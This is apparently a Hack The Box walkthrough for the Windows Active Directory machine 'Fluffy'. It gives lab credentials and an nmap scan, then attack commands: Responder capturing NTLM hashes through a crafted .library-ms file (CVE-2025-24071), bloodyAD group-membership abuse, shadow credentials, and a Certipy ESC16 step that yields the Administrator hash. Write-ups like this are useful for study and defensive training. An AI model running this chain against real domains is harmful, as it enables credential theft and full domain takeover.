---
title: Fluffy
date: 2025-07-24
description: Easy Windows AD machine starting from assumed-breach credentials — exploiting CVE-2025-24071 through a malicious library file for NTLM capture, pivoting via ACL abuse with bloodyAD, and escalating to Administrator through ADCS ESC16.
tags:
  - htb
  - Easy
  - Windows
---

# Initial Recon

Assumed breach — starting credentials provided:

```text
j.fleischman : J0elTHEM4n1990!
```

```bash
# Nmap 7.94SVN scan initiated Fri Jul 18 21:53:05 2025 as: /usr/lib/nmap/nmap -p53,88,139,389,445,464,593,636,3268,3269,5985,9389,49668,49689,49690,49692,49707,49726,49761 -A -oN scan_results.txt 10.10.11.69
Nmap scan report for fluffy.htb (10.10.11.69)
Host is up (0.27s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-18 23:23:14Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
|_ssl-date: 2025-07-18T23:24:54+00:00; +7h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-18T23:24:53+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-18T23:24:54+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-07-18T23:24:53+00:00; +7h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.fluffy.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.fluffy.htb
| Not valid before: 2025-04-17T16:04:17
|_Not valid after:  2026-04-17T16:04:17
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49668/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49692/tcp open  msrpc         Microsoft Windows RPC
49707/tcp open  msrpc         Microsoft Windows RPC
49726/tcp open  msrpc         Microsoft Windows RPC
49761/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (88%)
Aggressive OS guesses: Microsoft Windows Server 2019 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-07-18T23:24:16
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 139/tcp)
HOP RTT       ADDRESS
1   266.30 ms 10.10.14.1
2   266.42 ms fluffy.htb (10.10.11.69)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Jul 18 21:54:56 2025 -- 1 IP address (1 host up) scanned in 110.70 seconds
```
Standard domain controller stack — Kerberos, LDAP, SMB, WinRM. SMB enumeration with the provided credentials listed domain users:

```text
Administrator
Guest
krbtgt
DC01$
ca_svc
ldap_svc
p.agila
winrm_svc
j.coffey
j.fleischman
```

An `IT` share was accessible and contained `Upgrade_Notice.pdf`, which hinted at unpatched CVEs — including **CVE-2025-24071**, a File Explorer vulnerability that leaks NTLM hashes through crafted `.library-ms` files.

# User

## NTLM Capture via Malicious Archive

A malicious zip containing a `.library-ms` file pointing back to the attacker SMB server was crafted and staged on the `IT` share:

```bash
responder -I tun0 -wvF
```

When a user extracted the archive, the embedded SMB path triggered an authentication request — capturing the NetNTLMv2 hash of `p.agila`. The hash was cracked:

```text
p.agila : prometheusx-303
```

## ACL Abuse

BloodHound mapped the AD structure and revealed `p.agila` held **Generic Write** over the `SERVICE ACCOUNTS` group.

**Note:** the group membership resets after a few minutes — the operation had to be fast.

```bash
bloodyAD --host DC01.fluffy.htb -d fluffy.htb -u p.agila -p 'prometheusx-303' add groupMember "SERVICE ACCOUNTS" p.agila
```

With `p.agila` in the group, a shadow credential was injected against `winrm_svc` to obtain a TGT, granting a WinRM shell.

## Kerberoasting & Service Accounts

With access to service account hashes, `winrm_svc` and `ca_svc` hashes were extracted. The `ca_svc` account held enrollment rights on the certificate authority — the path to privilege escalation.

# Root

## ADCS ESC16

Enumerating certificate templates exposed a vulnerable configuration exploitable through **ESC16** — security extension disabled on the CA globally.

Following the escalation path via Certipy:

```bash
certipy auth -pfx ca_svc.pfx -dc-ip 10.10.11.69 -username ca_svc@fluffy.htb
```

The chain resolved to the **Administrator** account NTLM hash — root flag captured.

Gained `root`
